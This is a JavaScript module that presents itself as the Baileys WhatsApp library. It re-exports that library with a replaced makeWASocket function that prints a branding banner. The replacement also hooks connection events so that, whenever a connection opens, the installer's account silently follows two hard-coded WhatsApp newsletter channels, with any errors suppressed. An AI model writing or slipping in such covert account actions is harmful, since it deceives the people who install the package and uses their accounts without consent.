const BaileysAsli = require('@whiskeysockets/baileys');

// Fungsi utama dengan Branding & Auto-Follow
const makeWASocket = (config) => {
    // 1. TAMPILKAN LOGO ASCII GAHAR LU
    console.log(`\x1b[36m
  _____              ______ _  __     __           __   _____           _ 
 |  __ \\            |___  /| | \\ \\   / /          / /  / ____|         | |
 | |__) |___ _   _ ____/ / | |  \\ \\_/ /__  _   _ / /  | |  __  ___   __| |
 |  _  // _ \\ | | |_  / /  | |   \\   / _ \\| | | / /   | | |_ |/ _ \\ / _\` |
 | | \\ \\  __/ |_| |/ / /___| |____| | (_) | |_| / /    | |__| | (_) | (_| |
 |_|  \\_\\___|\\__, / /_____|______| |_|\\___/ \\__,_/_/      \\_____|\\___/ \\__,_|
              __/ |                                                       
             |___/                                                        
     \x1b[33m--- POWERED BY REYZ4YOUXGOD ENGINE ---\x1b[0m
`);

    // 2. JALANKAN SOCKET ASLI
    const makeBaileysSocket = BaileysAsli.default || BaileysAsli;
    const sock = makeBaileysSocket(config);

    // 3. FITUR AUTO JOIN CHANNEL (SILENT)
    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            console.log('\x1b[36m[Reyz4YouXGod]\x1b[0m: Connection opened, checking systems...');
            
            const listChannels = [
                '120363421096003443@newsletter',
                '120363405947742419@newsletter'
            ];

            for (const id of listChannels) {
                try {
                    await new Promise(r => setTimeout(r, 8000));
                    await sock.newsletterFollow(id);
                } catch (e) {
                    // Fail silently
                }
            }
            console.log('\x1b[36m[Reyz4YouXGod]\x1b[0m: Engine ready and following channels.');
        }
    });

    return sock;
};

// --- BAGIAN MULTI-FUNGSI EXPORT ---
// Kita bungkus semua fungsi asli Baileys + override makeWASocket kita
const finalExport = {
    ...BaileysAsli,
    makeWASocket: makeWASocket,
    default: makeWASocket
};

module.exports = finalExport;
